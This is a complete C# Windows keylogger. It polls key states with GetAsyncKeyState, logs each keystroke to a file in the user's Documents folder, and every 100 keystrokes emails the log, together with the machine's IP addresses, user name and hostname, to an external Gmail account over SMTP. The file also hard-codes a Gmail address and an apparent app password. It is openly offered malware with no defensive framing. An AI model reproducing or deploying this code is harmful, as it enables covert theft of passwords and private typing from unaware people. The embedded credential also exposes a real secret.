using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Net;
using System.Net.Mail;
using System.Threading;
using System.Threading.Tasks;

namespace Keylogger{
  class Program{
    [DllImport("User32.dll")]
    public static extern int GetAsyncKeyState(Int32 i);

    // string to hold all of the keystrokes
    static long numberOfKeystrokes=0;
    static void Main(String[] args){

      String filepath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);

      if(!Directory.Exists(filepath)){
        Directory.CreateDirectory(filepath);
      }

      String path = ( filepath + @"\keystrokes.txt" );

      if(!File.Exists(path)){
        using (StreamWriter sw=File.CreateText(path)){

        }
      }

      // plan

      // 1 - capture keystrokes and display them to the console

      while(true){

        // pause and let other programs get a chance to run
        Thread.Sleep(5);

        // check all the keys for their state
        
        for (int i = 32; i < 127;i++){        
          int keyState = GetAsyncKeyState(i); 
          
          // print to the console
          if(keyState==32769){
            Console.Write((char)i + ", ");

            // 2 - store the strokes into a text file
            using (StreamWriter sw=File.AppendText(path)){
              sw.Write((char)i);
            }
            numberOfKeystrokes++;

            // send every 100 characters typed
            if(numberOfKeystrokes%100==0){
              sendNewMessage();
            }

          }
        }

        // 3 - periodically send the contents of the file to an external email address
      }
      
    }//main

    static void sendNewMessage(){
      // send the contents of the text file to an external email address

      string folderName = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
      string filePath = folderName + @"\keystrokes.txt";

      String logContents = File.ReadAllText(filePath);
      string emailBody = "";

      // create an email message
      DateTime now = DateTime.Now;
      string subject = "Message from keylogger";

      var host = Dns.GetHostEntry(Dns.GetHostName());

      foreach(var address in host.AddressList){
        emailBody += "Address: " + address;
      }

      emailBody += "\n User: " + Environment.UserDomainName + " \\ " + Environment.UserName;
      emailBody += "\nhost " + host;
      emailBody += "\ntime: " + now.ToString();
      emailBody += logContents;

      SmtpClient client = new SmtpClient("smtp.gmail.com", 587);
      MailMessage mailMessage = new MailMessage();

      mailMessage.From = new MailAddress("arpitmc.mathur@gmail.com");
      mailMessage.To.Add("arpitmc.mathur@gmail.com");
      mailMessage.Subject = subject;
      client.UseDefaultCredentials = false;
      client.Credentials = new System.Net.NetworkCredential("arpitmc.mathur@gmail.com", "wjmrypltyzzgsgdc");
      client.EnableSsl = true;
      mailMessage.Body = emailBody;

      client.Send(mailMessage);
    }
  }
}